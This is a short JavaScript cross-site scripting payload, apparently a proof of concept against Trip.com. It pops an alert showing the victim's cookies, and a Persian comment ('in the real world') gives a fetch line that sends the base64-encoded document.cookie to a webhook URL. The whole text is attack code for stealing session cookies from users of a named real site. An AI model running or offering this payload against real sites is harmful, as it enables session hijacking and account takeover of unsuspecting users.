alert("XSS Triggered on Trip.com!\n\nYour Cookie:\n" + document.cookie);
// در دنیای واقعی: fetch('https://your-webhook.site?c=' + btoa(document.cookie));
